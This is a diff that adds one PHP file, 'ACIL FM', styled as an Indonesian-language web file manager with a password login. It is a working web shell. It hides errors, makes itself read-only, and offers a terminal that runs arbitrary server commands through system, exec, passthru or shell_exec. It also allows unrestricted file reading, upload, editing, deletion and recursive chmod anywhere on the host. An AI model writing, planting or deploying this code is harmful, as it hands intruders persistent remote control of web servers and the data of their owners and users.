@@ -1,0 +1,921 @@
+<?php
+// file_manager.php
+// ACIL FM — single-file implementation
+// Bahasa: Indonesian
+// Requirement: PHP with ZipArchive enabled for zip/unzip
+// Libraries: Bootstrap 5, jQuery, Bootstrap Icons loaded from CDN
+
+// ----------------- Fungsi exe() (dari user) -----------------
+error_reporting(0);
+$filename = __FILE__;
+$file_name = basename($filename);
+@chmod($filename, 0444);
+session_start();
+// ============ KONFIGURASI ============
+$PASSWORD_HASH = '38b0d0f70e7db357f3b341bf4c8ddb474efe2d6f464e77dc71f139d49c75c056';
+// ============ FUNGSI AUTENTIKASI ============
+if (!isset($_SESSION['authenticated'])) {
+    if (isset($_POST['password']) && hash('sha256', $_POST['password']) === $PASSWORD_HASH) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        showLoginForm();
+        exit;
+    }
+}
+
+// Logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+function exe($cmd) {
+    // Jika $cmd adalah file, baca isinya
+    if(is_file($cmd)) {
+        $buff = @file_get_contents($cmd);
+        return htmlspecialchars($buff);
+    }
+
+    if(function_exists('system')) {
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return htmlspecialchars($buff);
+    } elseif(function_exists('exec')) {
+        @exec($cmd,$results);
+        $buff = "";
+        foreach($results as $result) {
+            $buff .= $result . "\n";
+        }
+        return htmlspecialchars($buff);
+    } elseif(function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    } elseif(function_exists('shell_exec')) {
+        $buff = @shell_exec($cmd);
+        return htmlspecialchars($buff);
+    }
+
+    return false; // Jika tidak ada fungsi yang tersedia
+}
+// -----------------------------------------------------------
+function showLoginForm() {
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ACIL - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 20% 80%, #5b21b6 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, #1e3a8a 0%, transparent 50%),
+                        radial-gradient(circle at 40% 40%, #7c3aed 0%, transparent 50%);
+            animation: float 20s ease-in-out infinite;
+            opacity: 0.1;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            33% { transform: translate(-20px, -20px) rotate(120deg); }
+            66% { transform: translate(20px, -10px) rotate(240deg); }
+        }
+        
+        .login-container {
+            background: rgba(17, 17, 17, 0.95);
+            padding: 48px;
+            border-radius: 24px;
+            box-shadow: 0 25px 80px rgba(124, 58, 237, 0.12),
+                       0 0 0 1px rgba(124, 58, 237, 0.1);
+            backdrop-filter: blur(20px);
+            width: 90%;
+            max-width: 420px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.3);
+        }
+        
+        h2 {
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 12px;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle {
+            color: #6b7280;
+            text-align: center;
+            margin-bottom: 32px;
+            font-size: 14px;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            color: #9ca3af;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+        }
+        
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: rgba(31, 41, 55, 0.5);
+            border: 2px solid rgba(55, 65, 81, 0.5);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #7c3aed;
+            background: rgba(31, 41, 55, 0.8);
+            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.1);
+        }
+        
+        input[type="password"]::placeholder {
+            color: #4b5563;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(-100%);
+            transition: transform 0.6s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(124, 58, 237, 0.35);
+        }
+        
+        button:hover::before {
+            transform: translateX(0);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">🔐</div>
+        <h2>ACIL</h2>
+        <p class="subtitle">Enter Your Password</p>
+        <form method="POST">
+            <div class="input-group">
+                <label for="password">Password</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">🔑</span>
+                    <input type="password" name="password" id="password" placeholder="Enter your password" required autofocus>
+                </div>
+            </div>
+            <button type="submit">Login →</button>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+}
+// ----------------- Handling current dir / chdir based on ?dir -----------------
+if(isset($_GET['dir']) && $_GET['dir'] !== '') {
+    // jangan lupa sanitasi minimal: resolve realpath jika ada
+    $requested = $_GET['dir'];
+    // izinkan path relatif/absolute — coba realpath jika memungkinkan
+    $real = @realpath($requested);
+    if($real !== false) {
+        chdir($real);
+        $dir = $real;
+    } else {
+        // jika realpath gagal (mis: symlink), fallback ke nilai user-supplied
+        chdir($requested);
+        $dir = getcwd();
+    }
+} else {
+    $dir = getcwd();
+}
+// Build breadcrumb parts
+$scdir = array_values(array_filter(explode('/', str_replace('\\', '/', trim($dir, '/'))), function($v){return $v!=='';} ));
+if (substr($dir,0,1) === '/') {
+    // absolute unix path -> keep leading slash marker by using empty first element
+    $is_rooted = true;
+} else {
+    $is_rooted = false;
+}
+
+// Utility: normalize path for links
+function path_link($parts, $idx, $is_rooted) {
+    $out = $is_rooted ? '/' : '';
+    for($i=0;$i<=$idx;$i++){
+        $out .= $parts[$i];
+        if($i != $idx) $out .= '/';
+    }
+    return $out === '' ? '/' : $out;
+}
+
+// ----------------- Helper functions -----------------
+function human_size($bytes) {
+    if ($bytes < 1024) return $bytes . ' B';
+    $units = ['KB','MB','GB','TB'];
+    for ($i=0; $bytes >= 1024 && $i < count($units); $i++) $bytes /= 1024;
+    return round($bytes, 2) . ' ' . $units[$i];
+}
+
+function natural_sort_dirs_files($items) {
+    // $items: array of filenames (name only)
+    $dirs = [];
+    $files = [];
+    foreach($items as $it) {
+        if(is_dir($it)) $dirs[] = $it; else $files[] = $it;
+    }
+    usort($dirs, function($a,$b){ return strnatcasecmp($a,$b); });
+    usort($files, function($a,$b){ return strnatcasecmp($a,$b); });
+    return array_merge($dirs, $files);
+}
+
+// ----------------- POST actions handling -----------------
+$messages = [];
+$errors = [];
+
+// Helper to sanitize filenames for display
+function e($s){ return htmlspecialchars($s, ENT_QUOTES); }
+
+if($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Create folder
+    if(isset($_POST['create_folder'])) {
+        $name = $_POST['folder_name'] ?? '';
+        $target = trim($name);
+        if($target === '') {
+            $errors[] = "Nama folder kosong.";
+        } else {
+            if(@mkdir($target, 0777, false)) {
+                $messages[] = "Folder '" . e($target) . "' dibuat.";
+            } else {
+                $errors[] = "Gagal membuat folder '". e($target) ."' — cek permission.";
+            }
+        }
+    }
+
+    // Create file
+    if(isset($_POST['create_file'])) {
+        $name = $_POST['file_name'] ?? '';
+        $content = $_POST['file_content'] ?? '';
+        $target = trim($name);
+        if($target === '') {
+            $errors[] = "Nama file kosong.";
+        } else {
+            if(@file_put_contents($target, $content) !== false) {
+                $messages[] = "File '" . e($target) . "' dibuat.";
+            } else {
+                $errors[] = "Gagal membuat file '" . e($target) . "'.";
+            }
+        }
+    }
+
+    // Upload files (multiple)
+    if(isset($_FILES['upload_files'])) {
+        $up = $_FILES['upload_files'];
+        for($i=0;$i<count($up['name']);$i++){
+            if($up['error'][$i] === UPLOAD_ERR_OK) {
+                $dest = basename($up['name'][$i]);
+                if(@move_uploaded_file($up['tmp_name'][$i], $dest)) {
+                    $messages[] = "File '" . e($dest) . "' diupload.";
+                } else {
+                    $errors[] = "Gagal memindahkan file '" . e($up['name'][$i]) . "'.";
+                }
+            } else {
+                $errors[] = "Upload error pada '" . e($up['name'][$i]) . "'.";
+            }
+        }
+    }
+
+    // Delete selected (single or batch)
+    if(isset($_POST['delete_selected'])) {
+        $sel = $_POST['sel'] ?? [];
+        foreach($sel as $s) {
+            // protect . and ..
+            if($s === '.' || $s === '..') continue;
+            if(is_dir($s)) {
+                // delete directory recursively
+                $it = new RecursiveDirectoryIterator($s, RecursiveDirectoryIterator::SKIP_DOTS);
+                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
+                foreach($files as $file) {
+                    if($file->isDir()) @rmdir($file->getRealPath());
+                    else @unlink($file->getRealPath());
+                }
+                if(@rmdir($s)) $messages[] = "Folder '". e($s) ."' dihapus.";
+                else $errors[] = "Gagal menghapus folder '". e($s) ."'.";
+            } else {
+                if(@unlink($s)) $messages[] = "File '". e($s) ."' dihapus.";
+                else $errors[] = "Gagal menghapus file '". e($s) ."'.";
+            }
+        }
+    }
+
+    // Rename single
+    if(isset($_POST['rename_item'])) {
+        $old = $_POST['old_name'] ?? '';
+        $new = $_POST['new_name'] ?? '';
+        if($old === '' || $new === '') {
+            $errors[] = "Nama lama/baru kosong.";
+        } else {
+            if(@rename($old, $new)) $messages[] = "Rename berhasil: '".e($old)."' -> '".e($new)."'.";
+            else $errors[] = "Rename gagal.";
+        }
+    }
+
+    // Edit file save
+    if(isset($_POST['save_file'])) {
+        $file = $_POST['edit_file'] ?? '';
+        $content = $_POST['edit_content'] ?? '';
+        if($file === '' || !is_file($file)) $errors[] = "File tidak ditemukan.";
+        else {
+            if(@file_put_contents($file, $content) !== false) $messages[] = "File '".e($file)."' disimpan.";
+            else $errors[] = "Gagal menyimpan file '".e($file)."'.";
+        }
+    }
+
+    // Download handled by GET action below
+
+    // Zip selected
+    if(isset($_POST['zip_selected'])) {
+        $sel = $_POST['sel'] ?? [];
+        $zipname = trim($_POST['zip_name'] ?? 'archive.zip');
+        if($zipname === '') $zipname = 'archive.zip';
+        $zip = new ZipArchive();
+        if($zip->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
+            $errors[] = "Gagal membuat archive.";
+        } else {
+            foreach($sel as $s) {
+                if(is_dir($s)) {
+                    // add directory recursively
+                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s, RecursiveDirectoryIterator::SKIP_DOTS),
+                        RecursiveIteratorIterator::LEAVES_ONLY);
+                    foreach ($files as $file) {
+                        $filePath = $file->getRealPath();
+                        $relativePath = substr($filePath, strlen(getcwd()) + 1);
+                        $zip->addFile($filePath, $relativePath);
+                    }
+                } elseif(is_file($s)) {
+                    $zip->addFile($s, basename($s));
+                }
+            }
+            $zip->close();
+            $messages[] = "Archive '". e($zipname) ."' dibuat.";
+        }
+    }
+
+    // Unzip uploaded zip (or unzip existing)
+    if(isset($_POST['unzip_file'])) {
+        $zipfile = $_POST['zipfile'] ?? '';
+        $dest = $_POST['unzip_to'] ?? './';
+        if(!is_file($zipfile)) $errors[] = "File zip tidak ditemukan.";
+        else {
+            $z = new ZipArchive();
+            if($z->open($zipfile) === true) {
+                if($z->extractTo($dest)) {
+                    $messages[] = "Zip '".e($zipfile)."' diekstrak ke '".e($dest)."'.";
+                } else {
+                    $errors[] = "Gagal ekstrak.";
+                }
+                $z->close();
+            } else {
+                $errors[] = "Gagal membuka zip.";
+            }
+        }
+    }
+
+    // Read list entries inside zip (for preview)
+    if(isset($_POST['listzip'])) {
+        $zipfile = $_POST['zipfile'] ?? '';
+        if(!is_file($zipfile)) $errors[] = "File zip tidak ditemukan.";
+        else {
+            $z = new ZipArchive();
+            if($z->open($zipfile) === true) {
+                $zip_list = [];
+                for($i=0;$i<$z->numFiles;$i++){
+                    $zip_list[] = $z->getNameIndex($i);
+                }
+                $z->close();
+            } else {
+                $errors[] = "Gagal membuka zip.";
+            }
+        }
+    }
+
+    // Chmod single
+    if(isset($_POST['chmod_single'])) {
+        $path = $_POST['chmod_path'] ?? '';
+        $perm = $_POST['chmod_value'] ?? '';
+        if($path === '' || $perm === '') $errors[] = "Path atau permission kosong.";
+        else {
+            // sanitize octal string
+            $p = intval($perm, 8);
+            if(@chmod($path, $p)) $messages[] = "Chmod '".e($path)."' => ".e($perm)." berhasil.";
+            else $errors[] = "Chmod gagal pada '".e($path)."'.";
+        }
+    }
+
+    // Chmod bulk (All File / All Folder / All File dan Folder)
+    if(isset($_POST['chmod_bulk'])) {
+        $which = $_POST['chmod_target'] ?? '';
+        $perm = $_POST['chmod_bulk_value'] ?? '';
+        $p = intval($perm, 8);
+        if($perm === '') $errors[] = "Permission kosong.";
+        else {
+            $applied = 0;
+            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(getcwd(), RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::SELF_FIRST);
+            foreach($it as $item) {
+                if($which === 'all_file' && $item->isFile()) {
+                    if(@chmod($item->getRealPath(), $p)) $applied++;
+                } elseif($which === 'all_folder' && $item->isDir()) {
+                    if(@chmod($item->getRealPath(), $p)) $applied++;
+                } elseif($which === 'all' ) {
+                    if(@chmod($item->getRealPath(), $p)) $applied++;
+                }
+            }
+            $messages[] = "Chmod bulk diterapkan ke $applied item.";
+        }
+    }
+
+    // Terminal execute
+    if(isset($_POST['terminal_cmd'])) {
+        $cmd = $_POST['terminal_cmd_input'] ?? '';
+        $term_output = exe($cmd);
+    }
+}
+
+// ----------------- GET actions: download, preview, edit load, listdir -----------------
+if(isset($_GET['download'])) {
+    $f = $_GET['download'];
+    if(is_file($f)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($f).'"');
+        header('Content-Length: ' . filesize($f));
+        readfile($f);
+        exit;
+    } else {
+        $errors[] = "File untuk download tidak ditemukan.";
+    }
+}
+
+if(isset($_GET['edit'])) {
+    $edit_file = $_GET['edit'];
+    if(!is_file($edit_file)) {
+        $errors[] = "File tidak ditemukan.";
+        unset($edit_file);
+    } else {
+        $edit_content = @file_get_contents($edit_file);
+    }
+}
+
+if(isset($_GET['view'])) {
+    $view = $_GET['view'];
+    if(is_file($view)) {
+        header('Content-Type: text/plain; charset=utf-8');
+        echo file_get_contents($view);
+        exit;
+    }
+}
+
+// ----------------- Get directory listing -----------------
+$items = array_diff(scandir($dir), ['.','..']);
+$items = natural_sort_dirs_files($items);
+
+// ----------------- HTML / UI -----------------
+?>
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>ACIL FM</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Bootstrap Icons -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.5/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body.dark { background:#121212; color:#ddd; }
+    .card.dark { background:#1b1b1b; color:#ddd; }
+    pre.term { background:#000; color:#0f0; padding:10px; border-radius:4px; max-height:300px; overflow:auto; }
+    .file-row:hover { background: rgba(0,0,0,0.03); }
+    .breadcrumb a { text-decoration: none; }
+    .table td, .table th { vertical-align: middle; }
+    .small-muted { font-size:0.85em; color: #888; }
+  </style>
+</head>
+<body class="">
+<div class="container-fluid py-3">
+  <div class="d-flex justify-content-between align-items-center mb-2">
+    <h3><i class="bi-folder2-open"></i> ACIL FM</h3>
+    <div>
+      <button id="toggleDark" class="btn btn-sm btn-outline-secondary"><i class="bi-moon-stars"></i> Dark</button>
+      <a class="btn btn-sm btn-primary" href="?dir=<?php echo urlencode($dir); ?>"><i class="bi-arrow-clockwise"></i> Refresh</a>
+      <small class="text-muted ms-2">Current DIR: <strong><?php echo e($dir); ?></strong></small>
+    </div>
+  </div>
+
+  <?php if(!empty($messages)): ?>
+    <div class="alert alert-success"><?php foreach($messages as $m) echo e($m)."<br>"; ?></div>
+  <?php endif; ?>
+  <?php if(!empty($errors)): ?>
+    <div class="alert alert-danger"><?php foreach($errors as $e) echo e($e)."<br>"; ?></div>
+  <?php endif; ?>
+
+  <!-- Breadcrumb -->
+  <nav aria-label="breadcrumb">
+    <ol class="breadcrumb">
+      <?php
+        // Root link
+        $acc = $is_rooted ? '/' : (count($scdir)>0 ? $scdir[0] : $dir);
+        // Build clickable segments
+        if($is_rooted) {
+            echo '<li class="breadcrumb-item"><a href="?dir=/">/</a></li>';
+            for($i=0;$i<count($scdir);$i++){
+                $link = path_link($scdir, $i, true);
+                if($i == count($scdir)-1) echo '<li class="breadcrumb-item active" aria-current="page">'.e($scdir[$i]).'</li>';
+                else echo '<li class="breadcrumb-item"><a href="?dir='.urlencode($link).'">'.e($scdir[$i]).'</a></li>';
+            }
+        } else {
+            // relative path (windows or relative)
+            if(empty($scdir)) {
+                echo '<li class="breadcrumb-item active" aria-current="page">'.e($dir).'</li>';
+            } else {
+                for($i=0;$i<count($scdir);$i++){
+                    $link = path_link($scdir, $i, false);
+                    if($i == count($scdir)-1) echo '<li class="breadcrumb-item active" aria-current="page">'.e($scdir[$i]).'</li>';
+                    else echo '<li class="breadcrumb-item"><a href="?dir='.urlencode($link).'">'.e($scdir[$i]).'</a></li>';
+                }
+            }
+        }
+      ?>
+    </ol>
+  </nav>
+
+  <div class="row g-3">
+    <div class="col-lg-8">
+      <div class="card mb-3">
+        <div class="card-body">
+          <!-- Actions bar -->
+          <form id="mainForm" method="post" enctype="multipart/form-data">
+            <div class="d-flex gap-2 mb-3 flex-wrap">
+              <input type="file" name="upload_files[]" multiple class="form-control form-control-sm" style="max-width:300px;">
+              <button type="submit" class="btn btn-sm btn-success" name="upload_btn"><i class="bi-upload"></i> Upload</button>
+
+              <input type="text" name="zip_name" placeholder="archive.zip" class="form-control form-control-sm" style="width:150px;">
+              <button type="submit" name="zip_selected" class="btn btn-sm btn-secondary"><i class="bi-file-earmark-zip"></i> Zip Selected</button>
+
+              <button type="button" id="btnDelete" class="btn btn-sm btn-danger"><i class="bi-trash"></i> Delete Selected</button>
+
+              <div class="ms-auto">
+                <div class="form-check form-switch d-inline">
+                  <input class="form-check-input" type="checkbox" id="checkAll">
+                  <label class="form-check-label small" for="checkAll">Pilih semua</label>
+                </div>
+              </div>
+            </div>
+
+            <table class="table table-hover table-sm">
+              <thead class="table-light">
+                <tr>
+                  <th style="width:36px;"></th>
+                  <th>Nama</th>
+                  <th style="width:160px;">Ukuran</th>
+                  <th style="width:160px;">Permission</th>
+                  <th style="width:220px;">Aksi</th>
+                </tr>
+              </thead>
+              <tbody>
+                <?php foreach($items as $it): 
+                    $safe = e($it);
+                    $isdir = is_dir($it);
+                    $size = $isdir ? '-' : human_size(filesize($it));
+                    $perms = substr(sprintf('%o', fileperms($it)), -4);
+                ?>
+                <tr class="file-row">
+                  <td><input type="checkbox" class="selbox" name="sel[]" value="<?php echo e($it); ?>"></td>
+                  <td>
+                    <?php if($isdir): ?>
+                      <i class="bi-folder2-fill text-warning"></i>
+                      <a href="?dir=<?php echo urlencode((is_writable($it) ? $it : (getcwd().'/'.$it))); ?>"><?php echo $safe; ?></a>
+                    <?php else: ?>
+                      <i class="bi-file-earmark-text"></i>
+                      <?php echo $safe; ?>
+                    <?php endif; ?>
+                    <div class="small-muted"><?php echo is_link($it) ? 'symlink' : ''; ?></div>
+                  </td>
+                  <td><?php echo $size; ?></td>
+                  <td>
+                    <form style="display:inline;" method="post" class="d-inline-block">
+                      <input type="hidden" name="chmod_path" value="<?php echo e($it); ?>">
+                      <input type="text" name="chmod_value" value="<?php echo e($perms); ?>" class="form-control form-control-sm d-inline" style="width:80px; display:inline-block;">
+                      <button class="btn btn-sm btn-outline-primary" name="chmod_single" type="submit">chmod</button>
+                    </form>
+                  </td>
+                  <td>
+                    <?php if(!$isdir): ?>
+                      <a class="btn btn-sm btn-outline-secondary" href="?view=<?php echo urlencode($it); ?>" target="_blank"><i class="bi-eye"></i> View</a>
+                      <a class="btn btn-sm btn-outline-success" href="?download=<?php echo urlencode($it); ?>"><i class="bi-download"></i> DL</a>
+                      <a class="btn btn-sm btn-outline-warning" href="?edit=<?php echo urlencode($it); ?>"><i class="bi-pencil"></i> Edit</a>
+                      <?php if(strtolower(pathinfo($it, PATHINFO_EXTENSION)) === 'zip'): ?>
+                        <!-- Zip actions -->
+                        <button type="button" class="btn btn-sm btn-info btn-listzip" data-zip="<?php echo e($it); ?>"><i class="bi-list-ul"></i> ListZip</button>
+                        <button type="button" class="btn btn-sm btn-secondary btn-unzip" data-zip="<?php echo e($it); ?>"><i class="bi-arrow-down-square"></i> Unzip</button>
+                      <?php endif; ?>
+                    <?php else: ?>
+                      <a class="btn btn-sm btn-outline-primary" href="?dir=<?php echo urlencode($it); ?>"><i class="bi-folder2-open"></i> Open</a>
+                    <?php endif; ?>
+                    <button type="button" class="btn btn-sm btn-outline-secondary btn-rename" data-name="<?php echo e($it); ?>"><i class="bi-pencil-square"></i> Rename</button>
+                    <button type="button" class="btn btn-sm btn-outline-danger btn-delete" data-name="<?php echo e($it); ?>"><i class="bi-trash"></i> Delete</button>
+                  </td>
+                </tr>
+                <?php endforeach; ?>
+              </tbody>
+            </table>
+          </form>
+        </div>
+      </div>
+
+      <!-- Edit area -->
+      <?php if(isset($edit_file)): ?>
+        <div class="card mb-3">
+          <div class="card-header">Edit file: <?php echo e($edit_file); ?></div>
+          <div class="card-body">
+            <form method="post">
+              <input type="hidden" name="edit_file" value="<?php echo e($edit_file); ?>">
+              <textarea name="edit_content" rows="12" class="form-control"><?php echo e($edit_content); ?></textarea>
+              <div class="mt-2">
+                <button class="btn btn-primary" name="save_file">Simpan</button>
+                <a class="btn btn-secondary" href="?dir=<?php echo urlencode($dir); ?>">Batal</a>
+              </div>
+            </form>
+          </div>
+        </div>
+      <?php endif; ?>
+
+      <!-- Zip list preview -->
+      <div id="zipPreview" class="card mb-3" style="display:none;">
+        <div class="card-header">Isi Zip: <span id="zipName"></span></div>
+        <div class="card-body">
+          <ul id="zipList"></ul>
+        </div>
+      </div>
+
+      <!-- Unzip modal / form -->
+      <div id="unzipForm" style="display:none;">
+        <form method="post" id="unzipSubmit">
+          <input type="hidden" name="zipfile" id="unzip_zipfile" value="">
+          <div class="input-group mb-2">
+            <input type="text" name="unzip_to" class="form-control" value="./" placeholder="Destination folder">
+            <button class="btn btn-primary" name="unzip_file" type="submit">Unzip</button>
+          </div>
+        </form>
+      </div>
+
+      <!-- Create file/folder panel -->
+      <div class="card mb-3">
+        <div class="card-header">Create</div>
+        <div class="card-body">
+          <form method="post">
+            <div class="row g-2">
+              <div class="col-auto">
+                <input type="text" name="folder_name" class="form-control" placeholder="Nama folder">
+              </div>
+              <div class="col-auto">
+                <button class="btn btn-outline-success" name="create_folder" type="submit">Buat Folder</button>
+              </div>
+            </div>
+          </form>
+
+          <hr>
+
+          <form method="post">
+            <div class="mb-2">
+              <input type="text" name="file_name" class="form-control" placeholder="Nama file (mis: new.txt)">
+            </div>
+            <div class="mb-2">
+              <textarea name="file_content" class="form-control" rows="6" placeholder="Isi file (opsional)"></textarea>
+            </div>
+            <button class="btn btn-outline-primary" name="create_file" type="submit">Buat File</button>
+          </form>
+        </div>
+      </div>
+
+    </div> <!-- col-lg-8 -->
+
+    <div class="col-lg-4">
+      <!-- Terminal -->
+      <div class="card mb-3">
+        <div class="card-header">Terminal / Execute</div>
+        <div class="card-body">
+          <form method="post">
+            <div class="input-group mb-2">
+              <input type="text" name="terminal_cmd_input" class="form-control" placeholder="Perintah atau path file untuk dibaca">
+              <button class="btn btn-dark" name="terminal_cmd" type="submit">Run</button>
+            </div>
+            <?php if(isset($term_output)): ?>
+              <pre class="term"><?php echo e($term_output); ?></pre>
+            <?php endif; ?>
+          </form>
+        </div>
+      </div>
+
+      <!-- Chmod bulk -->
+      <div class="card mb-3">
+        <div class="card-header">Chmod Bulk</div>
+        <div class="card-body">
+          <form method="post">
+            <div class="mb-2">
+              <select name="chmod_target" class="form-select form-select-sm">
+                <option value="all_file">All File</option>
+                <option value="all_folder">All Folder</option>
+                <option value="all">All File dan Folder</option>
+              </select>
+            </div>
+            <div class="input-group mb-2">
+              <input type="text" name="chmod_bulk_value" class="form-control form-control-sm" placeholder="0755">
+              <button class="btn btn-outline-primary" name="chmod_bulk" type="submit">Apply</button>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- Rename / Delete single (modal-like simplified) -->
+      <div id="modalArea"></div>
+    </div>
+  </div>
+</div>
+
+<!-- jQuery + Bootstrap JS -->
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+$(function(){
+  // Dark toggle: simple toggle class
+  $('#toggleDark').on('click', function(){
+    $('body').toggleClass('dark');
+    $(this).find('i').toggleClass('bi-moon-stars bi-sun');
+  });
+
+  // Check all
+  $('#checkAll').on('change', function(){
+    $('.selbox').prop('checked', $(this).prop('checked'));
+  });
+
+  // Delete selected button
+  $('#btnDelete').on('click', function(){
+    if(confirm('Hapus item yang dipilih?')) {
+      $('<input>').attr({type:'hidden',name:'delete_selected',value:'1'}).appendTo('#mainForm');
+      $('#mainForm').submit();
+    }
+  });
+
+  // per-row delete
+  $('.btn-delete').on('click', function(){
+    var name = $(this).data('name');
+    if(confirm('Hapus '+name+' ?')) {
+      var form = $('<form method="post"></form>');
+      form.append($('<input>').attr({type:'hidden',name:'sel[]',value:name}));
+      form.append($('<input>').attr({type:'hidden',name:'delete_selected',value:'1'}));
+      $('body').append(form);
+      form.submit();
+    }
+  });
+
+  // rename dialog
+  $('.btn-rename').on('click', function(){
+    var name = $(this).data('name');
+    var html = '<div class="card card-body mb-3"><form method="post">';
+    html += '<input type="hidden" name="old_name" value="'+name+'">';
+    html += '<div class="input-group"><input name="new_name" class="form-control" value="'+name+'"><button class="btn btn-primary" name="rename_item">Rename</button></div>';
+    html += '</form></div>';
+    $('#modalArea').html(html);
+    window.scrollTo(0,0);
+  });
+
+  // list zip contents
+  $('.btn-listzip').on('click', function(){
+    var zip = $(this).data('zip');
+    $.post('', {listzip:1, zipfile: zip}, function(resp){
+      // server returns whole page; but we rely on ZIP preview by asking server via AJAX not available
+      // Instead: open small form that will POST to server and reload — simpler approach:
+      var form = $('<form method="post"></form>');
+      form.append($('<input>').attr({type:'hidden',name:'listzip',value:'1'}));
+      form.append($('<input>').attr({type:'hidden',name:'zipfile',value:zip}));
+      $('body').append(form);
+      form.submit();
+    });
+  });
+
+  // unzip action - open small inline form
+  $('.btn-unzip').on('click', function(){
+    var zip = $(this).data('zip');
+    $('#unzip_zipfile').val(zip);
+    var win = window.open('', 'unzipWindow', 'width=600,height=200');
+    var html = '<html><head><title>Unzip</title></head><body><form method="post">';
+    html += '<input type="hidden" name="zipfile" value="'+zip+'">';
+    html += '<input type="text" name="unzip_to" value="./" style="width:300px;">';
+    html += '<button name="unzip_file">Unzip</button>';
+    html += '</form></body></html>';
+    win.document.write(html);
+    win.document.close();
+  });
+
+  // fallback for AJAX-less zip list display (if server returned $zip_list after reload)
+  <?php if(isset($zip_list) && is_array($zip_list)): ?>
+    var zipEntries = <?php echo json_encode($zip_list); ?>;
+    $('#zipName').text('<?php echo e($zipfile ?? 'zip'); ?>');
+    $('#zipList').empty();
+    zipEntries.forEach(function(x){ $('#zipList').append($('<li>').text(x)); });
+    $('#zipPreview').show();
+    window.scrollTo(0,document.body.scrollHeight);
+  <?php endif; ?>
+
+});
+</script>
+</body>
+</html>
